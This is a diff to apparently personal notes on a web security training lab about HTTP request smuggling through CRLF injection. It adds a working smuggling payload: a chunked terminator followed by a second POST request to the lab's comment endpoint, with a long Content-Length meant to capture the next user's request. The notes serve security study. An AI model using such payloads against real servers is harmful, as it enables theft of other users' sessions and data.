@@ -298,6 +298,17 @@ foo:bar\r\nTransfer-Encoding: chunked
 After applying the `Transfer-Encoding` header the request will be `kettled` so you cant see other headers, you can only append content to body like below
 You request has to look like below
 ![image](https://user-images.githubusercontent.com/45040001/194731138-30e61723-6f32-4800-863a-cd4fcba39ed7.png)
+```
+0
+
+POST /post/comment HTTP/1.1
+Host: 0a5e008f045ff87bc06fc9ae00630039.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 910
+Cookie: session=dUB4Rv3FqQDaRnWPsJ7X99fzDVGYLGvy;
+
+csrf=m6zNlm811zQtwcOUpHr7ShoU6b4IwAHA&postId=3&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=aaa
+```
 
 ### Request splitting via CRLF injection
 
